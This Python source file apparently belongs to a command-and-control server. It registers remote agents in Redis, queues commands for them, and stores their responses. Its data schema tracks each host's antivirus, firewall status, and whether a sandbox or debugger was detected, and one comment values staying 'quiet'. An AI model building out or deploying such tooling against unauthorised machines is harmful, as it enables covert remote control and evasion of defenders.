import json
import pathlib

import munch
import redis
import yaml
from modules.config import Config
from modules.log import log
from modules.redis_models import Agent, AgentData, AgentCommand
from modules.utils import generate_unique_id
from redis_om import Field, HashModel, JsonModel, get_redis_connection
import traceback

logger = log(__name__)


class BaseAgent:
    """
    A base class that provides common functionality for all models.
    """

    def __init__(self, agent_id, config_file_path=None, **kwargs):
        # connect to redis
        self.redis_client = get_redis_connection(  # switch to config values
            host=Config().config.redis.bind.ip,
            port=Config().config.redis.bind.port,
            decode_responses=True,  # Ensures that strings are not returned as bytes
        )

        # info stuff - munch object
        self._data = munch.munchify(
            {
                "system": {
                    "hostname": None,
                    "os": None,
                    "os_version": None,
                    "architecture": None,
                    "username": None,
                    "privileges": None,
                    "uptime": None,
                },
                "network": {
                    "internal_ip": None,
                    "external_ip": None,
                    "mac_address": None,
                    "default_gateway": None,
                    "dns_servers": [],
                    "domain": None,
                },
                "hardware": {
                    "cpu": None,  # could get with the one assembly command to get that info - would be quiet.
                    "cpu_cores": None,
                    "ram": None,
                    "disk_space": None,
                },
                "agent": {
                    "id": agent_id,
                    "version": None,
                    "first_seen": None,
                    "last_seen": None,
                },
                "security": {
                    "av_installed": [],
                    "firewall_status": None,
                    "sandbox_detected": False,
                    "debugger_detected": False,
                },
                "geo": {
                    "country": None,
                    "city": None,
                    "latitude": None,
                    "longitude": None,
                },
                "config": {
                    "command_script": None,
                },
            }
        )
        self.data.agent.id = agent_id

        # # check if data exists already, if so, load that/overwrite the above
        # stored_data = AgentData.get(self.data.agent.id)
        # if stored_data:
        #     # logger.debug(
        #     #     f"Loaded existing agent data from Redis on init: {stored_data.json_blob}"
        #     # )
        #     self.data = json.loads(stored_data.json_blob)  # Ensure latest state

    @property
    def data(self):
        """
        Munch Object of data


        Access with dot notation:
            ex: obj.data.system.hostname = somehostname


        Dev Note:
            This function exists so there's function hints when you hover over the object/property
        """
        return self._data

    @data.setter
    def data(self, value):
        # Dev Note: Setting as munch object on SET, which is less common that retrieval.
        # This theoretically should be more efficent
        if not isinstance(value, munch.Munch):
            value = munch.munchify(value)
        self._data = value

    ##########
    # Script Options
    ##########

    def set_command_script(self, script_name):
        """
        Sets the command script

        """
        ## Problem here - TLDR: not getting saved to redis...

        logger.debug(f"Setting command script for {self.data.agent.id}: {script_name}")

        self.data.config.command_script = script_name
        # save newly updated data into redis
        self.unload_data()
        # self.load_data()

    def get_command_script(self):
        """
        Sets the command script

        """
        command_script = self.data.config.command_script

        logger.debug(
            f"Getting command script for {self.data.agent.id}: {command_script}"
        )

        return command_script

    ##########
    # Redis Stuff
    ##########

    def register(self):
        """
        Registers an agent in the system and ensures that the latest data is stored in Redis.
        """
        try:
            logger.info(f"Registering agent: {self.data.agent.id}")

            # Retrieve latest data from Redis before saving
            # doing this AGAIN (as well as in INIT), just incase data got changed somewhere
            # Want to be working with the latest data possible

            # bug exists here:

            try:
                stored_data = AgentData.get(self.data.agent.id)
                # logger.debug(
                #     f"Loaded existing agent data from Redis: {stored_data.json_blob}"
                # )
                self.data = json.loads(stored_data.json_blob)  # Ensure latest state

            # blanket exception, should handle this better
            except Exception as e:
                logger.warning(
                    f"Agent {self.data.agent.id} not found in Redis. This is expected on first check-in."
                )

            # Save the updated agent model in Redis
            agent_model = Agent(agent_id=self.data.agent.id)
            agent_model.save()

            # Unload the latest version of self.data, ensuring no loss of command_script
            self.unload_data()

        except Exception as e:
            logger.error(f"Error registering agent {self.data.agent.id}: {e}")
            logger.error(
                traceback.format_exc()
            )  # Print the full traceback for debugging
            raise e

    def unregister(self):
        """
        Deletes the agent from the system using the Agent model from `modules.redis_models`.
        The agent is identified and removed by `self.data.agent.id`.
        """
        logger.debug(f"Unregistering agent with ID: '{self.data.agent.id}'")
        # Deletion is handled by passing `self.data.agent.id` to the `redis.delete` function through `redis_om`
        Agent.delete(self.data.agent.id)

    def unload_data(self):
        """
        Store the given self.data in Redis under self.data.agent.id.
        """
        try:
            logger.debug(f"Unloading data for agent {self.data.agent.id} to redis")
            agent_data = AgentData(
                agent_id=self.data.agent.id, json_blob=json.dumps(self.data)
            )
            agent_data.save()
        except Exception as e:
            logger.error(f"Could not unload data to redis, error occured: {e}")
            raise e

    def load_data(self) -> dict:
        """
        Fetch and return the data dict from Redis by self.data.agent.id.
        """
        try:
            logger.debug(f"Loading data for agent {self.data.agent.id} from redis")
            fetched_instance = AgentData.get(self.data.agent.id)
            # JSON blob is stored as a json string in redis, need to convert back to dict
            new_dict = json.loads(fetched_instance.json_blob)
            self.data = munch.munchify(new_dict)
            return True

        except Exception as e:
            logger.error(f"Could not load data from redis, error occured: {e}")
            raise e

    #########
    # Command Queues
    ########
    # queue name should be agent id
    # need to test & rename consume_commands to return none or something on no command,
    # so a "no command" state can be implemented.

    # NOTE! queue is right to left
    # POP <-- item1 <-- item2 <-- item3 <-- push

    # chagne to command ID
    def enqueue_command(self, command):
        """
        Adds a command (string) to the Redis list (queue).

        returns command ID
        """
        try:

            command_id = generate_unique_id()

            # what's the key for this...?
            logger.debug(f"Enqueing command: '{command_id}'")
            self.redis_client.rpush(self.data.agent.id, command_id)
            self._store_command(command=command, command_id=command_id)
            return command_id

        except Exception as e:
            logger.error(e)
            raise e

    def dequeue_command(self):
        """
        Pops a command ID from the Redis queue and retrieves the full command.

        Returns:
            - command (str) if found
            - False if no command exists
        """
        try:
            logger.debug("Dequeuing command id")

            # Pop the command_id from Redis queue
            command_id = self.redis_client.lpop(self.data.agent.id)

            if not command_id:
                return False  # No command in queue

            # Retrieve the full command object from Redis OM
            command_obj = AgentCommand.get(command_id)

            if not command_obj:
                logger.warning(
                    f"Command ID {command_id} not found in AgentCommand store."
                )
                return False

            print(f"Dequeued Command: {command_obj.command}")

            return command_obj  # Return the command object

        except Exception as e:
            logger.error(e)
            raise e

    def get_all_commands_and_responses(self):
        """
        Gets all commands and responses for a specific agent.

        Returns:
            List of dictionaries with command_id, command, and response.
        """
        try:
            logger.debug(f"Fetching all commands for agent {self.data.agent.id}")

            # Construct key pattern (assuming the storage format follows `whispernet:agent:command:<command_id>`)
            key_pattern = f"whispernet:agent:command:*"

            # Use SCAN to iterate over matching keys
            command_keys = list(self.redis_client.scan_iter(key_pattern))

            result = []
            for key in command_keys:
                command_obj = AgentCommand.get(
                    key.split(":")[-1]
                )  # Extract ID from key

                # basically just check that the agent id matches the current agent id before returning the commands.
                if command_obj and command_obj.agent_id == self.data.agent.id:
                    result.append(
                        {
                            "command_id": command_obj.command_id,
                            "command": command_obj.command,
                            "response": (
                                command_obj.response if command_obj.response else None
                            ),
                            "timestamp": command_obj.timestamp,
                        }
                    )

            return result

        except Exception as e:
            logger.error(f"An error occurred: {e}")
            raise e

    def _store_command(self, command_id, command):
        """
        Store command key

        INTERNAL METHOD - shuold be caled from enqueue_command, as that generates the UUID for you

        """
        try:

            ac = AgentCommand(
                command_id=command_id,
                command=command,
                agent_id=self.data.agent.id,
                response="",
            )

            ac.save()
        except Exception as e:
            logger.error(e)
            raise e

    def store_response(self, command_id, response):
        """
        Stores response for a command.

        Finds the command by command_id and updates the response field.
        """
        try:
            # Retrieve the command entry by ID
            command_entry = AgentCommand.get(command_id)

            if not command_entry:
                logger.error(f"Command ID {command_id} not found.")
                return False  # Command not found

            # Update the response field
            command_entry.response = response
            command_entry.save()  # Save back to Redis

            logger.debug(f"Response stored for Command ID {command_id}")
            return True  # Successfully updated

        except Exception as e:
            logger.error(f"Error storing response for Command ID {command_id}: {e}")
            raise e
